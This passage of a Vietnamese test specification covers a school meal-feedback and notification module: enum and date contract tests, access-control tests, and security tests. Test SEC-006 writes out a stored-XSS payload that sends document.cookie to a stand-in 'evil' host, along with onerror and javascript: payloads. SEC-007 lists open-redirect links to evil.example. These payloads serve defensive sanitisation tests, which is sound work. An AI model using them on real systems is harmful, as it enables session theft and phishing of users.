**Feature Under Test:** `QuietHoursPolicy` + `NotificationPreference`
**Test File:** `.../domain/QuietHoursPolicyTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-015`
**Oracle Source:** **BR-158b** — *"Người dùng có thể **cấu hình giờ yên tĩnh** theo cài đặt cá nhân"* · `FX-012` (`U-TEACHER-001` đặt `21:00–07:00`) · **UC-088**

**Test Steps:**
1. Clock `21:30` VN · user mặc định (`22:00–06:00`) → ✅ gửi
2. Clock `21:30` VN · `U-TEACHER-001` (`21:00–07:00`) → ⏸️ **hoãn** (cùng thời điểm, khác kết quả)
3. Clock `06:30` VN · mặc định → ✅ gửi · `U-TEACHER-001` → ⏸️ hoãn
4. User **chưa có** bản ghi preference → dùng mặc định BR-158, **không** NPE

**Expected Result (PASS):** Cùng một `now` cho hai kết quả khác nhau theo từng người; thiếu preference → rơi về mặc định.
**Expected Result (FAIL):** Đọc mặc định từ hằng số toàn cục → BR-158b thành vô nghĩa (màn cấu hình lưu được nhưng không tới nơi dùng — đúng lớp lỗi mà `mock-data.ts` đã ghi chú cho `SecurityPolicy`: *"quản trị viên đặt độ dài tối thiểu 12 mà màn đổi mật khẩu vẫn cho qua ở 8"*).

**Current Status:** 🔴 Not written

---

### MF10-TC-017 — Thử lại tối đa 3 lần rồi chuyển email dự phòng (BR-159)

**Severity:** `HIGH`
**Feature Under Test:** `DeliveryRetryScheduler` · `RetryBackoffPolicy`
**Test File:** `.../notification/DeliveryRetryTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-016`
**Oracle Source:** **BR-159** — *"Khi gửi push notification thất bại, hệ thống **tự động thử lại**; **sau khi hết số lần thử lại**, hệ thống chuyển sang gửi **email dự phòng**"* · TDS §5.2 `DeliveryStatus {QUEUED, DEFERRED, SENT, FAILED, FALLBACK_EMAIL}` · `FX-015`

**Test Steps (State Transition Testing):**

| Kịch bản (`FX-015`) | Chuỗi trạng thái kỳ vọng | Email? |
|---|---|---|
| `U-ADMIN-001` (thành công ngay) | `QUEUED → SENT` | không |
| `U-CATERER-001` (fail 3 lần rồi OK) | `QUEUED → FAILED(1) → FAILED(2) → FAILED(3) → SENT` | không |
| `U-TEACHER-001` (luôn fail, `emailFallback=**false**`) | `QUEUED → FAILED(1..3) → **FAILED** (dừng)` | **không** |
| `U-ADMIN-001` (luôn fail, `emailFallback=true`) | `QUEUED → FAILED(1..3) → **FALLBACK_EMAIL**` | **1 email** |

**Expected Result (PASS):** `attempt` không vượt **3**; `MailSender` được gọi **đúng 1 lần** ở kịch bản 4 và **0 lần** ở kịch bản 3; `nextRetryAt` tăng theo backoff (không phải 0).
**Expected Result (FAIL):** Thiếu chặn `attempt ≤ 3` → scheduler quét mỗi phút và thử lại vĩnh viễn với người dùng đã gỡ app: hàng nghìn lượt gọi gateway mỗi ngày cho một thiết bị chết. Gửi email **trước** khi hết lượt retry → phụ huynh nhận cả push lẫn email cho cùng một việc.

**Current Status:** 🔴 Not written
**Implementation Note:** BR-159 **không** quy định con số cụ thể — chọn **3** theo TDS §6.4/C8 và ghi hằng số ở một chỗ (`RetryBackoffPolicy.MAX_ATTEMPTS`). Nếu Huy/Nam chốt số khác thì sửa hằng số, test đọc từ đó **trừ** ô biên (viết số tuyệt đối để tránh tautology — xem §5.1).

---

### MF10-TC-018 — `NotificationType` đúng 7 giá trị D6; `critical` là dẫn xuất (L2 / review §H5)

**Severity:** `CRITICAL`
**Feature Under Test:** `common/enums/NotificationType` · `NotificationCommand` deserialize
**Test File:** `.../dto/NotificationEnumContractTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-017`
**Oracle Source:** **D6** bảng enum — `NotificationType` = `MENU_PUBLISHED, INSPECTION_ALERT, CAPA_ASSIGNED, EXPIRY_ALERT, INCIDENT_ALERT, FOOD_RECALL, ALLERGY_ALERT` · `review.md` **H5** = **blocker**: *"Hai taxonomy trong cùng module … người dùng tắt `EXPIRY_ALERT` nhưng thông báo mang `type: 'SYSTEM'` → dispatcher không biết lọc gì. **Chốt 7**"* · `review_fix_plan.md` H5

**Test Steps:**
1. Assert `NotificationType.values().length == 7` và tập giá trị **đúng** danh sách D6
2. Deserialize `{"type":"ALLERGY_ALERT"}` → ✅
3. Deserialize `{"type":"FOOD_SAFETY"}` / `"NEWS"` / `"SYSTEM"` / `"ALLERGY"` → ❌ `HttpMessageNotReadableException` (4 giá trị của **TDS cũ và mock** đều bị từ chối)
4. Serialize → chuỗi SCREAMING_SNAKE, **không** phải nhãn tiếng Việt
5. Assert `NotificationType.INCIDENT_ALERT.isCritical() == true` cho đúng **3** loại; 4 loại còn lại `false`
6. Assert lớp `UserNotification` **không** có field `critical` *(tiền đề khẳng định: assert class có field `type` trước — chống xanh giả)*

**Expected Result (PASS):** Enum khóa ở 7 giá trị; 4 giá trị cũ bị từ chối; `critical` tính từ `type`.
**Expected Result (FAIL):** Giữ song song 2 taxonomy → màn cài đặt (7 khóa) và bản ghi thông báo (4 loại) không nói chuyện được: người dùng tắt `EXPIRY_ALERT` nhưng vẫn nhận, hoặc dispatcher lọc nhầm và **chặn cả cảnh báo dị ứng**.

**Current Status:** 🔴 Not written
**Implementation Note:** ⚠️ Đây là **thay đổi ghi đè TDS-MF10 §5.2** — Mạnh phải sửa TDS (mục **F1** §8.1) và Minh phải chốt ánh xạ **7 loại → 4 màu badge** ở `lib/labels.ts` (D6 nói FE giữ nhãn, nhưng ánh xạ màu **chưa ai định nghĩa**). Test **không** giả định ánh xạ màu.

---

### MF10-TC-019 — `MealType` lấy từ `common/enums`, từ chối chuỗi hiển thị tiếng Việt (L4 / review §H1)

**Severity:** `HIGH`
**Feature Under Test:** `common/enums/MealType` · `SubmitFeedbackRequest`
**Test File:** `.../dto/MealTypeContractTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-018`
**Oracle Source:** **D6** — `MealType` = `BREAKFAST / LUNCH / SNACK`, SCREAMING_SNAKE trong JSON và DB; nhãn `SNACK = "Bữa phụ"` · `review.md` **H1** = **blocker** (xung đột 3 chiều MF05/MF07/MF10) · TDS §5.2

**Test Steps:**
1. `{"mealType":"LUNCH"}` → ✅; entity lưu `LUNCH`; query `?mealType=LUNCH` lọc đúng
2. `{"mealType":"Bữa trưa"}` → ❌ 400 — **chính là payload mock đang gửi** (`feedback/meal/page.tsx:91`)
3. `{"mealType":"Bữa chiều"}` → ❌ 400 — ⚠️ giá trị của **MF07**, D6 ghi rõ *"Bữa phụ" ≠ "Bữa chiều"*
4. `{"mealType":"lunch"}` → ❌ 400 (phân biệt hoa/thường)
5. Assert `MealType` được import từ `com.sfms.common.enums`, **không** khai trong `com.sfms.mf10` (`M10-D09`)

**Expected Result (PASS):** Chỉ 3 giá trị D6 được nhận; bước 5 chặn việc module tự khai enum riêng.
**Expected Result (FAIL):** Nhận chuỗi tiếng Việt → cột `meal_type` chứa cả `"Bữa trưa"` lẫn `LUNCH` sau vài tháng; thống kê BR-141 theo bữa **chia đôi** mà không ai thấy lỗi.

**Current Status:** 🔴 Not written
**Implementation Note:** Nếu `common/enums/MealType` chưa có → test 🔴 vì **compile error**, đúng ý đồ (§6 Suspension: **không** khai tạm trong module để test xanh).

---

### MF10-TC-020 — `recipientRoles` dùng `RoleKey` kebab-case (L3 / review §H6)

**Severity:** `HIGH`
**Feature Under Test:** `NotificationCommand` · `UserNotification.recipientRoles`
**Test File:** `.../dto/RoleKeyContractTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-019`
**Oracle Source:** **D6** — `RoleKey` = `system-admin, school-admin, medical-staff, service-caterers, teacher, parent, supplier`; *"kebab-case … **chính là segment URL**, nên chốt kebab-case"* · `review.md` **H6** = **blocker** (*"Hai bộ định danh vai trò trong cùng hệ thống"*) · `notify.ts` + `notification-bell.tsx` (FE lọc bằng `recipientRoles?.includes(role)`)

**Test Steps:**
1. `publish(recipientRoles: ["medical-staff","school-admin"])` → ✅; JSON giữ nguyên kebab-case
2. `publish(recipientRoles: ["Medical Staff"])` → ❌ 400 — **giá trị TDS-MF10 v1.0 đang dùng**
3. `publish(recipientRoles: ["Raw Food Supplier"])` → ❌ 400; giá trị đúng là **`supplier`** (D6 ghi rõ FE không có key cho nhãn BR-007 này)
4. `audience=ROLES` + `recipientRoles=[]` → ❌ vi phạm `ck_ntf_roles` (TDS §5.2)
5. `audience=ALL` + `recipientRoles=null` → ✅

**Expected Result (PASS):** Chỉ 7 khóa kebab-case; rỗng-mà-ROLES bị chặn ở DB.
**Expected Result (FAIL):** Trộn hai bộ định danh → `notification-bell.tsx` lọc `recipientRoles.includes("medical-staff")` không khớp `"Medical Staff"` → **chuông trống rỗng** với đúng vai cần nhận cảnh báo y tế. Lỗi im lặng: không exception, chỉ là không ai thấy thông báo.

**Current Status:** 🔴 Not written

---

### MF10-TC-021 — Mọi field ngày là ISO-8601; `submittedAt` do server đặt (L14 / D4)

**Severity:** `HIGH`
**Feature Under Test:** Jackson config + toàn bộ DTO của MF10
**Test File:** `.../dto/DateFormatContractTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-020`
**Oracle Source:** **D4** — *"Ngày `"2026-07-29"` (`LocalDate`) · Ngày giờ `"2026-07-29T02:15:00Z"` (`Instant`)"* · `review.md` **A4** · `01_MVP_Backend_Implementation_Plan.md` §3 (*"ngày = ISO/Instant"*)

**Test Steps (Error Guessing):**
1. Serialize `FeedbackDetail`, `AnnouncementDetail`, `NotificationResponse` → assert **không** field nào khớp regex `\d{2}/\d{2}/\d{4}`
2. Assert `mealDate` khớp `^\d{4}-\d{2}-\d{2}$`; `submittedAt`/`publishedAt`/`sentAt`/`respondedAt` khớp ISO-8601 instant
3. Gửi `{"submittedAt":"01/07/2026 19:30"}` (**đúng chuỗi mock đang gửi** — `toLocaleString("vi-VN")`) → assert bị **bỏ qua**, `submittedAt` = `FX-001`
4. Gửi `{"submittedAt":"2020-01-01T00:00:00Z"}` → cũng bị bỏ qua (server chốt thời điểm)
5. Grep: không `@JsonFormat` nào trong package MF10

**Expected Result (PASS):** Không chuỗi ngày Việt nào ra khỏi API; `submittedAt` luôn là clock server.
**Expected Result (FAIL):** Nhận `submittedAt` từ client → phụ huynh gửi phản hồi kèm mốc thời gian giả để lách cửa sổ 24h, hoặc để nội dung xuất hiện đúng vào tuần thống kê khác (BR-141).

**Current Status:** 🔴 Not written
**Implementation Note:** Test này **dùng lại được cho 12 module** (D4) — cân nhắc đặt ở `common` test-fixtures thay vì copy 12 lần.

---

### MF10-TC-022 — `id` công khai là mã nghiệp vụ; `SEARCH_FIELDS` map qua `@JsonProperty` (L1 / D1)

**Severity:** `HIGH`
**Feature Under Test:** Toàn bộ DTO MF10 · `FeedbackSpec` · `AnnouncementSpec`
**Test File:** `.../dto/PublicIdContractTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-021`
**Oracle Source:** **D1** — *"`id` công khai **= mã nghiệp vụ** (`code`); path param dùng `code`; **khóa ngoại trong JSON dùng `code` của bảng đích**; UUID chỉ là PK nội bộ, **không lộ ra API**"* · `review.md` **A1** = **blocker** (nêu đích danh `"id": "FB-8809"`, `"id": "ANN-113"`) · TDS CF-M10-8 (`SEARCH_FIELDS` của MF10)

**Test Steps:**
1. Serialize `FeedbackDetail` → `id` = `"FB-8812"`, `dishId` = `"DISH-021"`, `mealSessionId` = `"MS-20260701-L"` — **không** UUID nào
2. Serialize `AnnouncementDetail` → `id` = `"ANN-112"`; `revisions[].by` là **tên**, `revisions[].at` là ISO
3. Assert `FeedbackSpec.SEARCH_FIELDS == ["comment","dishName","className"]` — **không** phải `["title","senderName","content"]` của §2b-5 (3 field **không tồn tại** trên entity — F4 §8.1)
4. Assert `AnnouncementSpec.SEARCH_FIELDS == ["title","content","audienceLabel"]`
5. Assert tên cột DB (`dish_name`, `class_name`) map đúng sang tên JSON (`dish`, `class`) qua `@JsonProperty` để không vỡ hợp đồng đọc của FE

**Expected Result (PASS):** Không UUID trong bất kỳ field `id`/`*Id`; `SEARCH_FIELDS` khớp entity thật.
**Expected Result (FAIL):** Lộ UUID → FE điều hướng `/parent/feedback/<uuid>` trong khi mọi chỗ khác hiển thị `FB-8809`; và `search` chạy trên field không tồn tại → **luôn trả rỗng** mà không báo lỗi.

**Current Status:** 🔴 Not written

---

### MF10-TC-023 — Trả lời phản hồi: chặn nội dung rỗng, ghi nhận trả lời trễ 48 giờ (UC-163)

**Severity:** `MEDIUM`
**Feature Under Test:** `FeedbackResponseService.respond()`
**Test File:** `.../service/FeedbackResponseTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-022`
**Oracle Source:** **BR-143** — *"**Service Caterers** có thể trả lời phản hồi của phụ huynh"* · **UC-163 EX1** (*"attempts to submit an empty response. System displays error and blocks submission"*) · **UC-163 EX2** (*"If a response to a negative review is submitted **after 48 hours**, system **logs the delay**"*) · mã `FBA-REQ` (TDS §10)

**Test Steps (Boundary Value Analysis quanh 48h, `rating=2` — `FX-004`):**

| Nội dung | Khoảng cách từ `submittedAt` | Kỳ vọng |
|---|---|---|
| `""` / `"   "` | bất kỳ | ❌ `FBA-REQ` — **chặn** |
| hợp lệ | `47h59m` | ✅ `lateResponse = false` |
| hợp lệ | **`48h00m`** | ✅ `lateResponse = false` — biên |
| hợp lệ | `48h01m` | ✅ `lateResponse = **true**` — **ghi nhận, KHÔNG chặn** |
| hợp lệ (`rating=5`) | `72h` | ✅ `lateResponse = **false**` — EX2 chỉ áp cho **đánh giá tiêu cực** |

**Expected Result (PASS):** Chỉ nội dung rỗng bị chặn; trễ chỉ **đánh dấu**; `rating≥3` không bao giờ `lateResponse=true`.
**Expected Result (FAIL):** Chặn trả lời sau 48h → caterer mất hẳn khả năng phản hồi khiếu nại cũ, trái UC-163 (*"logs the delay"* — ghi nhận, không cấm). Đặt `lateResponse` cho cả đánh giá tốt → chỉ số "trả lời trễ" mất nghĩa.

**Current Status:** 🔴 Not written
**Implementation Note:** ⚠️ **Ngưỡng 48 giờ chỉ có trong UC-163 EX2, không có BR nào** đứng sau. Ghi vào **F5** (§8.1) để Huy quyết định có cấp BR không — test vẫn dùng UC làm oracle (UC là nguồn hợp lệ theo Team Plan §2a).

---

### MF10-TC-024 — Thông báo lọc theo `audienceCodes`, hiển thị theo `audienceLabel` (L12 / review §H7)

**Severity:** `HIGH`
**Feature Under Test:** `AnnouncementService.create()` · `AnnouncementSpec`
**Test File:** `.../service/AnnouncementAudienceTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-023`
**Oracle Source:** `review.md` **H7** = **blocker** — *"Không có mã đối tượng thì … **mọi vai thấy mọi thông báo**"* · `review_fix_plan.md` **H5/H6/H7**: *"giữ `audienceCodes`"* · TDS **C9** · **UC-017** (Target Group nhiều lựa chọn) · **UC-126**

**Test Steps:**
1. `create({audienceCodes:["PARENT_GRADE_3","TEACHER"]})` → `audienceLabel` sinh ra `"Phụ huynh khối 3, Giáo viên"` (khớp cách mock ghép `join(", ")`)
2. `create({audienceCodes:[]})` → ❌ `FBA-REQ` — **UC-017 EX1** yêu cầu chọn ít nhất một nhóm; mock mặc định `"Toàn trường"` (`mock-server.ts:147`) là hành vi **sai** cần chặn
3. `create({audience:"Phụ huynh khối 3"})` (chỉ chuỗi, không mã) → ❌ `FBA-REQ`
4. `spec(audienceCodes chứa "TEACHER")` → chỉ trả announcement có `TEACHER` trong mảng — assert dùng toán tử JSONB `@>` (index `ix_ann_audience`), **không** `LIKE` trên `audience_label`

**Expected Result (PASS):** Lọc chạy trên mã; nhãn chỉ để hiển thị; thiếu mã bị chặn ngay lúc tạo.
**Expected Result (FAIL):** Mặc định `"Toàn trường"` khi thiếu mã → mọi thông báo soạn thiếu trường sẽ **phát cho toàn bộ trường**, kể cả thông báo nội bộ gửi riêng Y tế. Lọc bằng `LIKE` trên nhãn → `"Phụ huynh khối 1"` khớp cả `"Phụ huynh khối 10"` khi trường mở rộng cấp học.

**Current Status:** 🔴 Not written
**Implementation Note:** Danh mục `audienceCodes` phải chốt **cùng Minh** trước khi code (Entry Criteria §6) — hiện màn create và màn edit của mock dùng **hai tập tùy chọn khác nhau** (L12).

---

### SECURITY TEST CASES

> Test kiểm attack vector. Nhóm này của MF10 nặng hơn các module khác vì **PII + dữ liệu sức khỏe trẻ em** (BR-145) và vì announcement là **kênh phát tán tới hàng nghìn phụ huynh** (bề mặt XSS lớn nhất hệ thống).

---

### MF10-TC-SEC-001 — Phụ huynh chỉ thao tác phản hồi của chính mình, cho chính con mình

**Severity:** `CRITICAL`
**OWASP:** `A01:2021 — Broken Access Control`
**CWE:** `CWE-639 — Authorization Bypass Through User-Controlled Key` (IDOR)
**Legal:** PDPD — dữ liệu sức khỏe của trẻ khác
**Feature Under Test:** `FeedbackService.submit()/update()/retract()/listMine()`
**Test File:** `.../security/FeedbackOwnershipIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-037`
**Oracle Source:** TDS **§4.3** — *"Phụ huynh chỉ gửi/sửa/xóa phản hồi cho **con mình** … và chỉ đọc phản hồi **do mình gửi** — kiểm bằng `submitter_user_id`, **không** tin `studentId` trong body"* · **C2** · **BR-007** · **MSG-005**

**Preconditions:** `FX-003` (`FB-8812` của `U-PARENT-001`), `FX-005` (`FB-8801` của `U-PARENT-002`), `ParentChildPort` = `FX-013`.

**Test Steps (Attack Simulation):**
1. `U-PARENT-001` gửi `POST /feedbacks {studentId:"HS-3A-002"}` (con của phụ huynh khác) → **403 `FBA-005`**
2. `U-PARENT-001` gọi `PATCH /api/v1/feedbacks/FB-8801` (phản hồi của người khác) → **403**
3. `U-PARENT-001` gọi `DELETE /api/v1/feedbacks/FB-8801` → **403**
4. `U-PARENT-001` gọi `GET /api/v1/feedbacks` → chỉ trả phản hồi có `submitter_user_id = U-PARENT-001`; **không** có `FB-8801`
5. `U-PARENT-001` gọi `GET /api/v1/feedbacks/FB-8801` → **403** (hoặc 404 nếu chính sách chọn không lộ tồn tại — ghi rõ 1 lựa chọn, không nhận cả hai)

**Expected Result (PASS = hệ thống an toàn):** 4 lần 403 với `error.code == "FBA-005"`; danh sách bước 4 có đúng số bản ghi của chính chủ.
**Expected Result (FAIL = lỗ hổng):** Đổi 1 ký tự trong URL là đọc/sửa/xóa được phản hồi chứa **thông tin sức khỏe của con nhà khác**. Mock không chặn gì (generic REST), nên nếu backend chỉ "tin FE đã lọc" thì lỗ hổng này chắc chắn tồn tại.

**Current Status:** 🔴 Not written
**Implementation Note:** Bước 4 phải assert bằng **số lượng và ID cụ thể**, không assert `size() > 0` (xanh giả khi filter sai chiều).

---

### MF10-TC-SEC-002 — RBAC 7 role trên toàn bộ endpoint MF10

**Severity:** `CRITICAL`
**OWASP:** `A01:2021 — Broken Access Control`
**CWE:** `CWE-862 — Missing Authorization`
**Feature Under Test:** `@PreAuthorize` trên 4 controller
**Test File:** `.../security/Mf10RbacIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-037`
**Oracle Source:** **TDS §16 Authorization Matrix** · **BR-007** (RBAC 7 role) · **BR-143** (chỉ Service Caterers trả lời) · **MSG-005**

**Test Steps:** với mỗi ô ❌ của §16, gọi endpoint bằng JWT vai đó và assert **403 `FBA-005`** (không phải 404, không phải 500). Các ô trọng yếu:

| Endpoint | Vai bị chặn (mẫu) | Lý do |
|---|---|---|
| `POST /feedbacks` | `school-admin`, `service-caterers`, `supplier` | chỉ Parent/Teacher gửi |
| `POST /feedbacks/{id}/response` | `parent`, `teacher`, `school-admin`, `medical-staff` | **BR-143** — chỉ Service Caterers |
| `GET /feedbacks/dashboard` | `service-caterers`, `parent`, `teacher`, `medical-staff` | **UC-164** — chỉ School Administration |
| `POST`/`PATCH /announcements` | `teacher`, `parent`, `medical-staff`, `service-caterers`, `supplier` | **UC-017/089** — chỉ School Administration |
| `GET /feedbacks/eligible-meals` | `school-admin`, `service-caterers`, `supplier` | chỉ người được phản hồi |
| `GET /notifications` · `/notification-preferences/me` | *(không vai nào bị chặn)* | mọi vai đăng nhập đều có chuông + cấu hình |

**Expected Result (PASS):** Mọi ô ❌ trả **403** kèm `FBA-005`; mọi ô ✅ trả 2xx.
**Expected Result (FAIL):** Thiếu `@PreAuthorize` trên `/response` → phụ huynh tự "trả lời" phản hồi của chính mình dưới danh nghĩa đơn vị suất ăn — làm giả hồ sơ xử lý khiếu nại.

**Current Status:** 🔴 Not written
**Implementation Note:** ⚠️ Assert **đúng mã 403**, không dùng `isNot2xx()` — endpoint chưa tồn tại trả 404 cũng "không 2xx" (xanh giả loại 2, §5.1).

---

### MF10-TC-SEC-003 — Cách ly theo trường: `schoolId` chỉ lấy từ JWT

**Severity:** `CRITICAL`
**OWASP:** `A01:2021 — Broken Access Control`
**CWE:** `CWE-639`
**Feature Under Test:** `FeedbackSpec` · `AnnouncementSpec` · `NotificationRepository.findForUser()`
**Test File:** `.../security/Mf10TenantIsolationIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-009`, `TC-COND-037`
**Oracle Source:** **C2** (*"`schoolId`/`role`/`userId` **PHẢI** đọc từ JWT — KHÔNG tin body/query"*) · **BR-007** · TDS §16 (*"`School` = chỉ trong trường mình"*)

**Test Steps (Attack Simulation):**
1. `FX-019` (`school-admin` **trường SCH-HN-0051**) gọi `GET /feedbacks?schoolId=SCH-HN-0042` → trả **rỗng** (`total=0`), **không** phải dữ liệu trường 0042
2. Gọi `GET /api/v1/announcements/ANN-112` (thuộc trường 0042) → **404** (không lộ tồn tại)
3. Gọi `PATCH /api/v1/announcements/ANN-112` → **404/403**, DB **không** đổi
4. Gọi `GET /feedbacks/dashboard` → chỉ tổng hợp của trường 0051
5. `GET /notifications` → không nhận thông báo `school_id = 0042`; **vẫn nhận** thông báo `school_id IS NULL` (toàn nền tảng — `NTF-895`)

**Expected Result (PASS):** Không byte dữ liệu nào của trường khác lọt ra; bước 5 phân biệt đúng "toàn nền tảng" với "trường khác".
**Expected Result (FAIL):** Đọc `schoolId` từ query → một tài khoản BGH xem được phản hồi và thông báo của mọi trường trên nền tảng. Đây là rủi ro đa-tenant mà D1 §"Lý do" đã cảnh báo cho `partnerId`.

**Current Status:** 🔴 Not written

---

### MF10-TC-SEC-004 — Vai ngoài School Administration không thấy bản nháp và không thấy thông báo sai đối tượng

**Severity:** `CRITICAL`
**OWASP:** `A01:2021 — Broken Access Control`
**CWE:** `CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor`
**Feature Under Test:** `AnnouncementService.listForAudience()` · `getDetail()`
**Test File:** `.../security/AnnouncementVisibilityIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-038`
**Oracle Source:** **UC-125** (*"retrieves all announcements **accessible to the actor**"*) · **UC-126** · TDS **CF-M10-6** · `review.md` **H7** = **blocker** (*"mọi vai thấy mọi thông báo"*) · **BR-007**

**Preconditions:** `FX-006` (`ANN-112` PUBLISHED, `PARENT_ALL`), `FX-007` (`ANN-111` PUBLISHED, `PARENT_GRADE_3`), `FX-008` (`ANN-113` **DRAFT**, `TEACHER`).

**Test Steps (Attack Simulation):**

| Actor | `GET /announcements` kỳ vọng | `GET /announcements/ANN-113` (DRAFT) |
|---|---|---|
| `school-admin` | thấy **cả 3** (kể cả DRAFT) | ✅ 200 |
| `parent` (khối 3) | thấy `ANN-112`, `ANN-111` | ❌ **404** |
| `parent` (khối 1) | thấy `ANN-112` — **không** `ANN-111` | ❌ 404 |
| `teacher` | **không** thấy `ANN-113` dù audience là `TEACHER` (vì **DRAFT**) | ❌ 404 |
| `supplier` | thấy 0 bản ghi | ❌ 404 |

**Expected Result (PASS = an toàn):** DRAFT **không bao giờ** lọt ra ngoài School Administration, kể cả khi audience khớp vai; lọc audience chạy trên `audienceCodes`.
**Expected Result (FAIL = lỗ hổng):** Mock hiện gọi `usePagedList("announcements", {page,pageSize,search,urgent})` **không lọc gì** → phụ huynh đọc được thông báo nháp về sự cố ATTP **trước khi nhà trường quyết định công bố**. Đây là rò rỉ có hậu quả truyền thông thật, không chỉ kỹ thuật.

**Current Status:** 🔴 Not written
**Implementation Note:** Hàng `teacher` là ô quan trọng nhất: audience **khớp** nhưng status **không** — dễ lọt nếu chỉ lọc một trong hai điều kiện.

---

### MF10-TC-SEC-005 — `revisions[]` chỉ ở detail và chỉ cho School Administration (L13 / review §H9)

**Severity:** `HIGH`
**OWASP:** `A01:2021`
**CWE:** `CWE-200`
**Feature Under Test:** `AnnouncementService.getDetail()` · `listForAdmin()/listForAudience()`
**Test File:** `.../security/AnnouncementVisibilityIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-039`
**Oracle Source:** **UC-105** Normal Flow bước 5 — *"**If the actor role is "School Administration"**, the system **additionally** displays the complete revision history log (BR-144)"* · `review_fix_plan.md` **H9** (*"List trả `revisionCount`; `revisions[]` chỉ ở detail cho School Administration"*)

**Test Steps:**
1. `school-admin` `GET /announcements/ANN-111` → có `revisions[]` **3 mục**, mỗi mục đủ `at`/`by`/`note`
2. `parent` `GET /announcements/ANN-111` → **không** có key `revisions` trong JSON *(tiền đề: assert response **có** `title`/`content` trước — chống xanh giả)*
3. `teacher`, `service-caterers`, `supplier`, `medical-staff` → như bước 2
4. Mọi vai `GET /announcements` (list) → có `revisionCount` (số), **không** có `revisions` (mảng)
5. `parent` list → `revisionCount` ẩn hoặc bằng `null` *(chốt 1 phương án: **ẩn hẳn key** — nhất quán với bước 2)*

**Expected Result (PASS):** Lịch sử sửa đổi chỉ hiện với BGH; list không bao giờ trả mảng revision.
**Expected Result (FAIL):** Trả nguyên `revisions[]` cho phụ huynh (**mock đang làm vậy**) → lộ nội dung nội bộ kiểu *"Bổ sung kết quả sơ bộ từ CDC"*, *"Cập nhật biện pháp khắc phục của đơn vị suất ăn"* (đúng dữ liệu seed `ANN-111`), tức là lộ diễn biến xử lý sự cố trước khi nhà trường chốt thông tin.

**Current Status:** 🔴 Not written

---

### MF10-TC-SEC-006 — Nội dung thông báo bị sanitize trước khi lưu (XSS)

**Severity:** `CRITICAL`
**OWASP:** `A03:2021 — Injection`
**CWE:** `CWE-79 — Improper Neutralization of Input During Web Page Generation`
**Feature Under Test:** `AnnouncementService.create()/update()` · `HtmlSanitizer`
**Test File:** `.../security/AnnouncementXssIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-040`
**Oracle Source:** TDS **§4.3** — *"Announcement: HTML trong `content` phải **sanitize** (thoát thẻ) trước khi lưu — thông báo hiển thị cho hàng nghìn phụ huynh, là bề mặt XSS lớn nhất của hệ thống"* · cùng lớp với `review.md` I8 (MF07 `description` là HTML)

**Test Steps (Attack Simulation):**
1. `POST /announcements {content:"<script>fetch('//evil/'+document.cookie)</script>Kính gửi…"}` → assert DB **không** chứa chuỗi `<script`
2. `content` chứa `<img src=x onerror=alert(1)>` → thuộc tính `onerror` bị loại
3. `content` chứa `<a href="javascript:alert(1)">link</a>` → `href` bị loại hoặc vô hiệu
4. `content` chứa xuống dòng + ký tự tiếng Việt có dấu (seed `ANN-112` có `\n\n`) → **giữ nguyên**, không bị escape quá tay
5. Cùng bộ payload trên `title` và trên `revisionNote`

**Expected Result (PASS = an toàn):** 3 payload tấn công bị vô hiệu; nội dung hợp lệ (có dấu, có xuống dòng) **không** bị biến dạng.
**Expected Result (FAIL = lỗ hổng):** Một thông báo nhiễm script phát tới `PARENT_ALL` = XSS lưu trữ chạm toàn bộ 4.380 tài khoản phụ huynh của trường, với quyền phiên của họ.

**Current Status:** 🔴 Not written
**Implementation Note:** Sanitize ở **service khi lưu** (không chỉ khi render) — vì cùng nội dung còn đi ra email dự phòng (BR-159), nơi FE không kiểm soát.

---

### MF10-TC-SEC-007 — Deep link của thông báo chỉ nhận đường dẫn nội bộ

**Severity:** `HIGH`
**OWASP:** `A01:2021` · `A03:2021`
**CWE:** `CWE-601 — URL Redirection to Untrusted Site (Open Redirect)`
**Feature Under Test:** `NotificationCommand` validator
**Test File:** `.../security/NotificationLinkValidationTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-040`
**Oracle Source:** TDS **§4.3** — *"Deep link `link` của notification chỉ nhận **đường dẫn nội bộ** (bắt đầu bằng `/`) — chặn `javascript:`/URL ngoài"* · `notification-bell.tsx` (`router.push(selected.link)` — FE **push thẳng** giá trị này)

**Test Steps (Attack Simulation):**

| `link` | Kỳ vọng |
|---|---|
| `"/school-admin/feedback"` | ✅ |
| `"/medical-staff/incidents/INC-2026-014"` | ✅ |
| `"https://evil.example/login"` | ❌ 422 |
| `"//evil.example/login"` | ❌ 422 — **protocol-relative**, dễ lọt nếu chỉ kiểm `startsWith("/")` |
| `"javascript:alert(1)"` | ❌ 422 |
| `null` | ✅ (link là tùy chọn) |

**Expected Result (PASS = an toàn):** Chỉ path nội bộ 1 dấu `/` đi qua; ô `//evil.example` bị chặn.
**Expected Result (FAIL = lỗ hổng):** `notification-bell.tsx` gọi `router.push(href)` → phụ huynh bấm thông báo trong app và bị đưa tới trang đăng nhập giả mạo, trong ngữ cảnh họ vừa tin tưởng vì thông báo đến từ nhà trường.

**Current Status:** 🔴 Not written
**Implementation Note:** Ô `//evil.example` là lý do **không** dùng `link.startsWith("/")` làm điều kiện duy nhất.

---

### MF10-TC-SEC-008 — Không JWT thì chặn; log không chứa nội dung phản hồi

**Severity:** `HIGH`
**OWASP:** `A07:2021 — Identification and Authentication Failures` · `A09:2021 — Security Logging and Monitoring Failures`
**CWE:** `CWE-306 — Missing Authentication for Critical Function` · `CWE-532 — Insertion of Sensitive Information into Log File`
**Legal:** **PDPD** — dữ liệu sức khỏe
